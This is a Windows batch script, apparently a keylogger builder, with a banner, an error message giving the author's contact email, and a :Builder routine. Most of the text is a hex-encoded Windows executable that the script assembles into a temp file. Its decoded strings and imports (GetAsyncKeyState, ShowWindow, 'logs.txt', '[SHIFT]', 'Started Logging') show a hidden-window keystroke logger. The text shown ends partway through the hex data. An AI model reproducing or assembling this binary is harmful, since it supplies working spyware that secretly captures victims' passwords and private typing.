echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
echo  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹^>%Window_0_Version% by %Window_0_Author%º
echo                            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo. & echo.
echo ^> Oops, something wrong happen :/
echo.
echo ^> Please contact me by email at failed_attempt11 [at] hotmail.com
echo. & echo. & echo. & echo. & echo. & echo.
pause
EXIT
:Builder
del /f /q /a "%TMP%\keyz.dat" >nul 2>&1
for %%b In (
"4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000"
"000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F"
"742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010500A994D74D00200000"
"41020000E00007030B01023800100000001C000000020000201200000010000000200000000040000010000000020000"
"040000000100000004000000000000000060000000040000F7DB00000300000000002000001000000000100000100000"
"0000000010000000000000000000000000500000B0030000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000002E74657874000000"
"540F0000001000000010000000040000000000000000000000000000600000602E646174610000004000000000200000"
"0002000000140000000000000000000000000000400000C02E7264617461000010050000003000000006000000160000"
"000000000000000000000000400000402E62737300000000B00000000040000000000000000000000000000000000000"
"00000000800000C02E69646174610000B00300000050000000040000001C0000000000000000000000000000400000C0"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000005589E583EC18895DF88B550831DB8975FC8B0231F68B003D910000C077433D8D"
"0000C0725BBE01000000C704240800000031C089442404E8640D000083F801746C85C0742AC7042408000000FFD0BBFF"
"FFFFFF89D88B75FC8B5DF889EC5DC204003D930000C074BD3D940000C074BB89D88B75FC8B5DF889EC5DC204008D7600"
"3D050000C075E8C704240B00000031F689742404E8070D000083F801743485C074CDC704240B000000FFD0EBA1C70424"
"08000000BB01000000895C2404E8DE0C000085F67488E815080000BBFFFFFFFFEB81C704240B000000B901000000BBFF"
"FFFFFF894C2404E8B40C0000E962FFFFFFEB0D909090909090909090909090905589E55383EC248D5DF8C70424001040"
"00E8AA0D000083EC04E8C2070000C745F800000000B8004040008D55F4895C24108B0D00204000894424048954240889"
"4C240CC7042404404000E8810C0000A11040400085C07458A3102040008B152051400085D20F858B00000083FAE07420"
"A110404000894424048B1D205140008B4B30890C24E8360C00008B152051400083FAC0741B8B1D10404000895C24048B"
"0D205140008B5150891424E8100C0000E8FB0B00008B1D102040008918E8EE06000083E4F0E8C60B00008B08894C2408"
"8B150040400089542404A104404000890424E8A900000089C3E8920B0000891C24E8DA0C0000894424048B1520514000"
"8B4210890424E8B50B00008B1520514000E955FFFFFF8D76008DBC27000000005589E583EC08C7042401000000FF1518"
"514000E8C8FEFFFF908DB426000000005589E583EC08C7042402000000FF1518514000E8A8FEFFFF908DB42600000000"
"558B0D3051400089E55DFFE18D742600558B0D2451400089E55DFFE1909090905589E55DE92708000090909090909090"
"5589E583EC2883E4F0B80000000083C00F83C00FC1E804C1E0048945EC8B45ECE83B0A0000E8D6060000E8210C0000C7"
"44240400000000C7042400304000E8BD0B000083EC088945FCC7442404000000008B45FC890424E8B40B000083EC08C7"
"44240413304000C7042416304000E82D0B00008945F8C7042400000000E80E0B00008945F48B45F889442404C7042420"
"304000E8E80A00008D45F4890424E8CD0A000089C28B45F889442404891424E8CC0A00008B45F889442404C704245830"
"4000E8B90A00008B45F8890424E88E0A0000E8080000008945F08B45F0C9C35589E583EC28C744240413304000C70424"
"16304000E8A70A00008945F0C7042405000000E8580B000083EC0466C745EE080066817DEEDE000F8FE00400000FBF45"
"EE890424E8F70A000083EC04663D01800F85B9040000C744240413304000C7042416304000E8560A00008945E8837DE8"
"00750CC745E401000000E9AE040000837DE8000F848604000066837DEE267E2A66837DEE407F238B45E8894424040FBF"
"45EE890424E8C60900008B45E8890424E8CB090000E96304000066837DEE407E3566837DEE5A7F2E0FB745EE83C02066"
"8945EE8B45E8894424040FBF45EE890424E88A0900008B45E8890424E88F090000E9270400000FBF45EE83E8088945E0"
"817DE0D60000000F87F70300008B55E08B0495C8304000FFE08B45E889442404C7042420000000E8440900008B45E889"
"0424E849090000E9D30300008B45E889442404C7042479304000E8510900008B45E8890424E826090000E9B00300008B"
"45E889442404C7042481304000E82E0900008B45E8890424E803090000E98D0300008B45E889442404C704248B304000"
"E80B0900008B45E8890424E8E0080000E96A0300008B45E889442404C7042497304000E8E80800008B45E8890424E8BD"
"080000E9470300008B45E889442404C704249D304000E8C50800008B45E8890424E89A080000E9240300008B45E88944"
"2404C70424A4304000E8A20800008B45E8890424E877080000E9010300008B45E889442404C70424AA304000E87F0800"
"008B45E8890424E854080000E9DE0200008B45E889442404C70424AD304000E85C0800008B45E8890424E831080000E9"
"BB0200008B45E889442404C70424AF304000E8390800008B45E8890424E80E080000E9980200008B45E889442404C704"
"24B1304000E8160800008B45E8890424E8EB070000E9750200008B45E889442404C70424B5304000E8F30700008B45E8"
"890424E8C8070000E9520200008B45E889442404C70424B7304000E8D00700008B45E8890424E8A5070000E92F020000"
"8B45E889442404C70424B9304000E8AD0700008B45E8890424E882070000E90C0200008B45E889442404C704242B0000"
"00E85A0700008B45E8890424E85F070000E9E90100008B45E889442404C704242C000000E8370700008B45E8890424E8"
"3C070000E9C60100008B45E889442404C704242D000000E8140700008B45E8890424E819070000E9A30100008B45E889"
"442404C704242E000000E8F10600008B45E8890424E8F6060000E9800100008B45E889442404C7042430000000E8CE06"
"00008B45E8890424E8D3060000E95D0100008B45E889442404C7042431000000E8AB0600008B45E8890424E8B0060000"
"E93A0100008B45E889442404C7042432000000E8880600008B45E8890424E88D060000E9170100008B45E889442404C7"
"042433000000E8650600008B45E8890424E86A060000E9F40000008B45E889442404C7042434000000E8420600008B45"
"E8890424E847060000E9D10000008B45E889442404C7042435000000E81F0600008B45E8890424E824060000E9AE0000"
"008B45E889442404C7042436000000E8FC0500008B45E8890424E801060000E98B0000008B45E889442404C704243700"
"0000E8D90500008B45E8890424E8DE050000EB6B8B45E889442404C7042438000000E8B90500008B45E8890424E8BE05"
"0000EB4B8B45E889442404C7042439000000E8990500008B45E8890424E89E050000EB2B8B45E889442404C70424BB30"
"4000E8A90500008B45E8890424E87E050000EB0B8B45E8890424E8710500000FB745EE40668945EEE914FBFFFF8B45F0"
"890424E858050000E9EFFAFFFF8B45E4C9C3909090909090909090909090909055B91035400089E5EB148DB600000000"
"8B51048B0183C10801820000400081F91035400072EA5DC390909090909090905589E5DBE35DC3909090909090909090"
"5589E583EC08A1202040008B0885C97426EB0D90909090909090909090909090FF108B0D202040008B51048D4104A320"
"20400085D275E9C9C38DB426000000005589E55383EC04A1401F400083F8FF742985C089C3741389F68DBC2700000000"
"FF149D401F40004B75F6C70424F0184000E8FAF8FFFF5B5B5DC38B0D441F400031C085C9EB0A408B1485441F400085D2"
"75F4EBBD8DB6000000008DBF000000005589E55383EC04A12040400085C07536A1401F4000BB01000000891D20404000"
"83F8FF742585C089C3740F908D742600FF149D401F40004B75F6C70424F0184000E88AF8FFFF5B5B5DC38B0D441F4000"
"31C085C9EB0A408B1485441F400085D275F4EBC190909090909090909090909055A17040400089E55D8B4804FFE189F6"
"55BA4200000089E5530FB7C083EC64895424088D55A831DB89542404890424FF15F8504000BA1F000000B90100000083"
"EC0C85C07507EB4601C94A780E807C2AA84175F409CB01C94A79F2833B3C750789D88B5DFCC9C3B954344000BAEA0000"
"00894C240C89542408C7042481344000B8A034400089442404E892020000B8CC344000BBE40000008944240C895C2408"
"EBD78DB426000000008DBC27000000005589E557565381ECCC0000008B0D7040400085C974088D65F45B5E5F5DC3C745"
"9841414141A1303440008D7598C7459C41414141C745A0414141418945B8A134344000C745A441414141C745A8414141"
"418945BCA138344000C745AC41414141C745B0414141418945C0A13C344000C745B4414141418945C4A1403440008945"
"C8A1443440008945CCA1483440008945D0A14C3440008945D40FB70550344000668945D8893424FF15F45040000FB7C0"
"83EC0485C0898544FFFFFF0F853B010000C704243C000000E8D302000085C089C30F8459010000FC89C78B8544FFFFFF"
"B90F000000F3ABC74304601E4000B901000000C74308001A4000A140404000C7033C0000008B1544404000C743280000"
"0000894314A1302040008953188B153420400089431CA150404000895320C74330FFFFFFFF89432C8B153C204000A138"
"204000895338BA1F00000089433489F689D821C883F80119C0242001C9044188842A48FFFFFF4A79E7A1303440008985"
"68FFFFFFA13434400089856CFFFFFFA138344000898570FFFFFFA13C344000898574FFFFFFA140344000898578FFFFFF"
"A14434400089857CFFFFFFA148344000894580A14C3440008945840FB70550344000668945888D8548FFFFFF890424FF"
"15E85040000FB7F883EC0485FF754231D285D2751E891C24E8A3010000893424FF15F450400083EC040FB7C0E85FFDFF"
"FF89C3891D704040008D4304A3604040008D4308A3804040008D65F45B5E5F5DC389F8E838FDFFFF39D889FA75B1EBB1"
"E87B01000090909090909090909090905189E183C1083D00100000721081E9001000008309002D00100000EBE929C183"
"090089E089CC8B088B4004FFE09090905589E583EC188B4514894424108B45108944240C8B450C894424088B45088944"
"2404A12051400083C040890424E82E010000A12051400083C040890424E80E010000E8F9000000909090909090909090"
"FF251851400090900000000000000000FF251C51400090900000000000000000FF251051400090900000000000000000"
"FF255851400090900000000000000000FF251451400090900000000000000000FF252851400090900000000000000000"
"FF250C51400090900000000000000000FF254851400090900000000000000000FF253851400090900000000000000000"
"FF253451400090900000000000000000FF254C51400090900000000000000000FF255C51400090900000000000000000"
"FF254051400090900000000000000000FF255051400090900000000000000000FF255451400090900000000000000000"
"FF252C51400090900000000000000000FF253C51400090900000000000000000FF254451400090900000000000000000"
"FF256851400090900000000000000000FF257051400090900000000000000000FF256C51400090900000000000000000"
"FF25FC50400090900000000000000000FF25F050400090900000000000000000FF25EC50400090900000000000000000"
"FF250051400090900000000000000000FF25F850400090900000000000000000FF25F450400090900000000000000000"
"FF25E8504000909000000000000000005589E55DE947F3FFFF90909090909090FFFFFFFF301F400000000000FFFFFFFF"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000000000000000000000000000000000000FFFFFFFF000000000000000000000000"
"00400000000000000000000000000000501F400000000000000000000000000000000000FFFFFFFF00000000FFFFFFFF"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000436F6E736F6C6557696E646F77436C61737300612B006C6F67732E7478740000"
"0A230A23230A2323230A2323232323232323232323232323232323232323230A23232353746172746564204C6F676769"
"6E672040404020000A2323232323232323232323232323232323232323230A2323230A23230A230A005B53484946545D"
"000A5B454E5445525D0A005B4241434B53504143455D005B5441425D005B4354524C5D005B44454C5D003A3B003F007E"
"007B0D0A005C007D0022000A5B434150534C4F434B5D0A00F214400015154000741840007418400074184000CF144000"
"7418400074184000AC144000381540007418400074184000541840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000891440007418400074184000741840007418400074184000"
"74184000741840007418400074184000741840007418400074184000741840005B154000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"74184000741840007418400074184000741840007418400074184000741840007418400074184000FF16400022174000"
"45174000681740008B174000AE174000D1174000F4174000141840003418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007E1540007316400096164000B9164000DC164000A1154000C415400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"741840007418400074184000741840007418400074184000741840007418400074184000741840007418400074184000"
"74184000E71540000A1640002D164000501640000000000000000000000000002D4C49424743435733322D45482D322D"
"534A4C4A2D475448522D4D494E475733320000007733325F7368617265647074722D3E73697A65203D3D2073697A656F"
"66285733325F45485F534841524544290025733A25753A206661696C656420617373657274696F6E20602573270A0000"
"2E2E2F2E2E2F6763632F6763632F636F6E6669672F693338362F7733322D7368617265642D7074722E63000047657441"
"746F6D4E616D6541202861746F6D2C20732C2073697A656F662873292920213D20300000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"0000000000000000000000000000000054500000000000000000000028530000E8500000785000000000000000000000"
"8C5300000C510000D45000000000000000000000A4530000685100000000000000000000000000000000000000000000"
"00000000785100008451000094510000A4510000B0510000C0510000E05100000000000000000000E8510000F8510000"
"08520000185200002C52000038520000405200004C52000058520000605200006C52000074520000805200008C520000"
"94520000A0520000A8520000B0520000B8520000C4520000D05200000000000000000000D8520000E8520000FC520000"
"0000000000000000785100008451000094510000A4510000B0510000C0510000E05100000000000000000000E8510000"
"F851000008520000185200002C52000038520000405200004C52000058520000605200006C5200007452000080520000"
"8C52000094520000A0520000A8520000B0520000B8520000C4520000D05200000000000000000000D8520000E8520000"
"FC52000000000000010041646441746F6D4100000900416C6C6F63436F6E736F6C6500009B004578697450726F636573"
"73000000AF0046696E6441746F6D4100DC0047657441746F6D4E616D65410000DF02536574556E68616E646C65644578"
"63657074696F6E46696C746572000000EB02536C6565700027005F5F6765746D61696E61726773003C005F5F705F5F65"
"6E7669726F6E00003E005F5F705F5F666D6F64650000000050005F5F7365745F6170705F747970650000000079005F63"
"6578697400000000E9005F696F6200005E015F6F6E6578697400000084015F7365746D6F64650000150261626F727400"
"1C026174657869740000000027026374696D65002D0266636C6F736500000000300266666C757368000000003802666F"
"70656E003902667072696E74660000003A026670757463003B026670757473003F0266726565000072026D616C6C6F63"
"0000000090027369676E616C00000000B10274696D650000D10046696E6457696E646F7741000000DE00476574417379"
"6E634B657953746174650000410253686F7757696E646F77000000000050000000500000005000000050000000500000"
"00500000005000004B45524E454C33322E646C6C00000000145000001450000014500000145000001450000014500000"
"145000001450000014500000145000001450000014500000145000001450000014500000145000001450000014500000"
"1450000014500000145000006D73766372742E646C6C00002850000028500000285000005553455233322E646C6C0000"
"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
"00000000000000000000000000000000000000000000000000000000000000002E66696C650000000F000000FEFF0000"
"6701637274312E6300000000000000000000000000000000040000000000000001002000030100000000000000000000"
"0000000000000000000000001E0000000001000001002000030000000000320000002002000001002000020000000000"
"42000000400200000100200002005F61746578697400600200000100200002005F5F6F6E657869747002000001002000"
"02002E74657874000000000000000100000003017C02000026000000000000000000000000002E646174610000000000"
"00000200000003010000000000000000000000000000000000002E627373000000000000000004000000030108000000"
"00000000000000000000000000002E66696C6500000019000000FEFF0000670163727473747566662E63000000000000"
"00000000000055000000800200000100200002010000000000000000000000000000000000002E746578740000008002"
"00000100000003010900000001000000000000000000000000002E646174610000000000000002000000030100000000"
"00000000000000000000000000002E627373000000001000000004000000030100000000000000000000000000000000"
"00002E66696C6500000025000000FEFF000067016D61696E2E630000000000000000000000005F6D61696E0000009002"
"000001002000020000000000650000006F0300000100200002002E746578740000009002000001000000030112060000"
"68000000000000000000000000002E646174610000000000000002000000030100000000000000000000000000000000"
"00002E62737300000000100000000400000003010000000000000000000000000000000000002E726461746100000000"
"000003000000030124040000D7000000000000000000000000002E66696C650000002D000000FEFF0000670143525467"
"6C6F622E630000000000000000002E74657874000000B008000001000000030100000000000000000000000000000000"
"00002E64617461000000000000000200000003010400000000000000000000000000000000002E627373000000001000"
"00000400000003010000000000000000000000000000000000002E66696C6500000035000000FEFF0000670143525466"
"6D6F64652E6300000000000000002E74657874000000B008000001000000030100000000000000000000000000000000"
"00002E64617461000000100000000200000003010000000000000000000000000000000000002E627373000000001000"
"00000400000003010400000000000000000000000000000000002E66696C650000003D000000FEFF000067017478746D"
"6F64652E630000000000000000002E74657874000000B008000001000000030100000000000000000000000000000000"
"00002E64617461000000100000000200000003010400000000000000000000000000000000002E627373000000002000"
"00000400000003010000000000000000000000000000000000002E66696C6500000047000000FEFF0000670170736575"
"646F2D72656C6F632E6300000000000000006F000000B008000001002000020100000000000000000000000000000000"
"00002E74657874000000B00800000100000003012800000003000000000000000000000000002E646174610000002000"
"00000200000003010000000000000000000000000000000000002E627373000000002000000004000000030100000000"
"00000000000000000000000000002E66696C6500000052000000FEFF000067014352545F667031302E63000000000000"
"00005F66707265736574E0080000010020000201000000000000000000000000000000000000000000008A000000E008"
"00000100200002002E74657874000000E00800000100000003010700000000000000000000000000000000002E646174"
"61000000200000000200000003010000000000000000000000000000000000002E627373000000002000000004000000"
"03010000000000000000000000000000000000002E66696C6500000060000000FEFF000067016763636D61696E2E6300"
"0000000000000000000000009400000020000000040000000300702E3000000000002000000002000000030000000000"
"A1000000F008000001002000020100000000000000000000000000000000000000000000B40000003009000001002000"
"02005F5F5F6D61696E00900900000100200002002E74657874000000F008000001000000030104010000110000000000"
"00000000000000002E64617461000000200000000200000003010400000001000000000000000000000000002E627373"
"00000000200000000400000003011000000000000000000000000000000000002E66696C6500000022010000FEFF0000"
"670100000000C7000000000000000000000000002E74657874000000000A000001000000030100000000000000000000"
"00000000000000002E64617461000000300000000200000003010000000000000000000000000000000000002E627373"
"000000003000000004000000030102000000000000000000000000000000000000000000DB0000003004000003000000"
"030000000000EC000000000A00000100200003010000000000000000000000000000000000000000000010010000100A"
"000001002000030000000000250100004000000004000000030000000000380100003000000002000000030000000000"
"4301000050000000040000000300000000005001000038000000020000000300000000005B010000B00A000001002000"
"02002E74657874000000000A0000010000000301E50200002C000000000000000000000000002E646174610000003000"
"00000200000003011000000000000000000000000000000000002E627373000000004000000004000000030120000000"
"00000000000000000000000000002E7264617461000030040000030000000301C3000000000000000000000000000000"
"000070726F6265000000F60C0000010000000600646F6E65000000000D0D00000100000006002E74657874000000F00C"
"00000100000003012D00000000000000000000000000000000002E646174610000004000000002000000030100000000"
"00000000000000000000000000002E627373000000006000000004000000030100000000000000000000000000000000"
"00002E74657874000000200D00000100000003010000000000000000000000000000000000002E646174610000004000"
"00000200000003010000000000000000000000000000000000002E627373000000006000000004000000030100000000"
"00000000000000000000000000000000000077010000200D000001002000020100000000000000000000000000000000"
"00002E74657874000000200D00000100000003014700000005000000000000000000000000002E646174610000004000"
"00000200000003010000000000000000000000000000000000002E627373000000006000000004000000030100000000"
"00000000000000000000000000002E74657874000000700D00000100000003002E646174610000004000000002000000"
"03002E62737300000000600000000400000003002E696461746124374C0300000500000003002E696461746124352001"
"00000500000003002E696461746124348C0000000500000003002E69646174612436380200000500000003002E746578"
"74000000700D00000100000003002E64617461000000400000000200000003002E627373000000006000000004000000"
"03002E69646174612437440300000500000003002E69646174612435180100000500000003002E696461746124348400"
"00000500000003002E69646174612436180200000500000003002E74657874000000800D00000100000003002E646174"
"61000000400000000200000003002E62737300000000600000000400000003002E696461746124375C03000005000000"
"03002E69646174612435300100000500000003002E696461746124349C0000000500000003002E696461746124366002"
"00000500000003002E74657874000000800D00000100000003002E64617461000000400000000200000003002E627373"
"00000000600000000400000003002E69646174612437500300000500000003002E696461746124352401000005000000"
"03002E69646174612434900000000500000003002E69646174612436400200000500000003002E74657874000000800D"
"00000100000003002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461"
"74612437480300000500000003002E696461746124351C0100000500000003002E696461746124348800000005000000"
"03002E696461746124362C0200000500000003002E74657874000000900D00000100000003002E646174610000004000"
"00000200000003002E62737300000000600000000400000003002E696461746124373C0300000500000003002E696461"
"74612435100100000500000003002E696461746124347C0000000500000003002E69646174612436F801000005000000"
"03002E74657874000000A00D00000100000003002E64617461000000400000000200000003002E627373000000006000"
"00000400000003002E69646174612437840300000500000003002E69646174612435580100000500000003002E696461"
"74612434C40000000500000003002E69646174612436C40200000500000003002E74657874000000B00D000001000000"
"03002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461746124374003"
"00000500000003002E69646174612435140100000500000003002E69646174612434800000000500000003002E696461"
"74612436080200000500000003002E74657874000000C00D00000100000003002E646174610000004000000002000000"
"03002E62737300000000600000000400000003002E69646174612437540300000500000003002E696461746124352801"
"00000500000003002E69646174612434940000000500000003002E696461746124364C0200000500000003002E746578"
"74000000D00D00000100000003002E64617461000000400000000200000003002E627373000000006000000004000000"
"03002E69646174612437380300000500000003002E696461746124350C0100000500000003002E696461746124347800"
"00000500000003002E69646174612436E80100000500000003002E74657874000000E00D00000100000003002E646174"
"61000000400000000200000003002E62737300000000600000000400000003002E696461746124377403000005000000"
"03002E69646174612435480100000500000003002E69646174612434B40000000500000003002E69646174612436A002"
"00000500000003002E74657874000000F00D00000100000003002E64617461000000400000000200000003002E627373"
"00000000600000000400000003002E69646174612437640300000500000003002E696461746124353801000005000000"
"03002E69646174612434A40000000500000003002E69646174612436740200000500000003002E74657874000000000E"
"00000100000003002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461"
"74612437600300000500000003002E69646174612435340100000500000003002E69646174612434A000000005000000"
"03002E696461746124366C0200000500000003002E74657874000000100E00000100000003002E646174610000004000"
"00000200000003002E62737300000000600000000400000003002E69646174612437780300000500000003002E696461"
"746124354C0100000500000003002E69646174612434B80000000500000003002E69646174612436A802000005000000"
"03002E74657874000000200E00000100000003002E64617461000000400000000200000003002E627373000000006000"
"00000400000003002E69646174612437880300000500000003002E696461746124355C0100000500000003002E696461"
"74612434C80000000500000003002E69646174612436D00200000500000003002E74657874000000300E000001000000"
"03002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461746124376C03"
"00000500000003002E69646174612435400100000500000003002E69646174612434AC0000000500000003002E696461"
"746124368C0200000500000003002E74657874000000400E00000100000003002E646174610000004000000002000000"
"03002E62737300000000600000000400000003002E696461746124377C0300000500000003002E696461746124355001"
"00000500000003002E69646174612434BC0000000500000003002E69646174612436B00200000500000003002E746578"
"74000000500E00000100000003002E64617461000000400000000200000003002E627373000000006000000004000000"
"03002E69646174612437800300000500000003002E69646174612435540100000500000003002E69646174612434C000"
"00000500000003002E69646174612436B80200000500000003002E74657874000000600E00000100000003002E646174"
"61000000400000000200000003002E62737300000000600000000400000003002E696461746124375803000005000000"
"03002E696461746124352C0100000500000003002E69646174612434980000000500000003002E696461746124365802"
"00000500000003002E74657874000000700E00000100000003002E64617461000000400000000200000003002E627373"
"00000000600000000400000003002E69646174612437680300000500000003002E696461746124353C01000005000000"
"03002E69646174612434A80000000500000003002E69646174612436800200000500000003002E74657874000000800E"
"00000100000003002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461"
"74612437700300000500000003002E69646174612435440100000500000003002E69646174612434B000000005000000"
"03002E69646174612436940200000500000003002E66696C6500000032010000FEFF0000670166616B65000000000000"
"0000000000000000686E616D6500000078000000050000000300667468756E6B00000C0100000500000003002E746578"
"74000000900E00000100000003010000000000000000000000000000000000002E646174610000004000000002000000"
"03010000000000000000000000000000000000002E627373000000006000000004000000030100000000000000000000"
"00000000000000002E69646174612432140000000500000003011400000003000000000000000000000000002E696461"
"74612435080100000500000003010400000000000000000000000000000000002E696461746124347400000005000000"
"03010400000000000000000000000000000000002E66696C6500000055010000FEFF0000670166616B65000000000000"
"00000000000000002E74657874000000900E00000100000003010000000000000000000000000000000000002E646174"
"61000000400000000200000003010000000000000000000000000000000000002E627373000000006000000004000000"
"03010000000000000000000000000000000000002E69646174612434CC00000005000000030104000000000000000000"
"00000000000000002E69646174612435600100000500000003010400000000000000000000000000000000002E696461"
"746124378C0300000500000003010B00000000000000000000000000000000002E74657874000000900E000001000000"
"03002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461746124379803"
"00000500000003002E69646174612435680100000500000003002E69646174612434D40000000500000003002E696461"
"74612436D80200000500000003002E74657874000000A00E00000100000003002E646174610000004000000002000000"
"03002E62737300000000600000000400000003002E69646174612437A00300000500000003002E696461746124357001"
"00000500000003002E69646174612434DC0000000500000003002E69646174612436FC0200000500000003002E746578"
"74000000B00E00000100000003002E64617461000000400000000200000003002E627373000000006000000004000000"
"03002E696461746124379C0300000500000003002E696461746124356C0100000500000003002E69646174612434D800"
"00000500000003002E69646174612436E80200000500000003002E66696C6500000065010000FEFF0000670166616B65"
"0000000000000000000000000000686E616D65000000D4000000050000000300667468756E6B00006801000005000000"
"03002E74657874000000C00E00000100000003010000000000000000000000000000000000002E646174610000004000"
"00000200000003010000000000000000000000000000000000002E627373000000006000000004000000030100000000"
"00000000000000000000000000002E696461746124322800000005000000030114000000030000000000000000000000"
"00002E69646174612435640100000500000003010400000000000000000000000000000000002E69646174612434D000"
"00000500000003010400000000000000000000000000000000002E66696C65000000A4010000FEFF0000670166616B65"
"00000000000000000000000000002E74657874000000C00E000001000000030100000000000000000000000000000000"
"00002E64617461000000400000000200000003010000000000000000000000000000000000002E627373000000006000"
"00000400000003010000000000000000000000000000000000002E69646174612434E000000005000000030104000000"
"00000000000000000000000000002E696461746124357401000005000000030104000000000000000000000000000000"
"00002E69646174612437A40300000500000003010B00000000000000000000000000000000002E74657874000000C00E"
"00000100000003002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461"
"74612437200300000500000003002E69646174612435FC0000000500000003002E696461746124346800000005000000"
"03002E69646174612436C00100000500000003002E74657874000000D00E00000100000003002E646174610000004000"
"00000200000003002E62737300000000600000000400000003002E69646174612437140300000500000003002E696461"
"74612435F00000000500000003002E696461746124345C0000000500000003002E696461746124369401000005000000"
"03002E74657874000000E00E00000100000003002E64617461000000400000000200000003002E627373000000006000"
"00000400000003002E69646174612437100300000500000003002E69646174612435EC0000000500000003002E696461"
"74612434580000000500000003002E69646174612436840100000500000003002E74657874000000F00E000001000000"
"03002E64617461000000400000000200000003002E62737300000000600000000400000003002E696461746124372403"
"00000500000003002E69646174612435000100000500000003002E696461746124346C0000000500000003002E696461"
"74612436E00100000500000003002E74657874000000000F00000100000003002E646174610000004000000002000000"
"03002E62737300000000600000000400000003002E696461746124371C0300000500000003002E69646174612435F800"
"00000500000003002E69646174612434640000000500000003002E69646174612436B00100000500000003002E746578"
"74000000100F00000100000003002E64617461000000400000000200000003002E627373000000006000000004000000"
"03002E69646174612437180300000500000003002E69646174612435F40000000500000003002E696461746124346000"
"00000500000003002E69646174612436A40100000500000003002E74657874000000200F00000100000003002E646174"
"61000000400000000200000003002E62737300000000600000000400000003002E696461746124370C03000005000000"
"03002E69646174612435E80000000500000003002E69646174612434540000000500000003002E696461746124367801"
"00000500000003002E66696C65000000B4010000FEFF0000670166616B650000000000000000000000000000686E616D"
"6500000054000000050000000300667468756E6B0000E80000000500000003002E74657874000000300F000001000000"
"03010000000000000000000000000000000000002E646174610000004000000002000000030100000000000000000000"
"00000000000000002E62737300000000600000000400000003010000000000000000000000000000000000002E696461"
"74612432000000000500000003011400000003000000000000000000000000002E69646174612435E400000005000000"
"03010400000000000000000000000000000000002E696461746124345000000005000000030104000000000000000000"
"00000000000000002E66696C65000000C2010000FEFF0000670166616B6500000000000000000000000000002E746578"
"74000000300F00000100000003010000000000000000000000000000000000002E646174610000004000000002000000"
"03010000000000000000000000000000000000002E627373000000006000000004000000030100000000000000000000"
"00000000000000002E69646174612434700000000500000003010400000000000000000000000000000000002E696461"
"74612435040100000500000003010400000000000000000000000000000000002E696461746124372803000005000000"
"03010D00000000000000000000000000000000002E66696C65000000CE010000FEFF0000670163727473747566662E63"
"00000000000000000000000082010000300F00000100200003010000000000000000000000000000000000002E746578"
"74000000300F00000100000003010900000001000000000000000000000000002E646174610000004000000002000000"
"03010000000000000000000000000000000000002E627373000000006000000004000000030100000000000000000000"
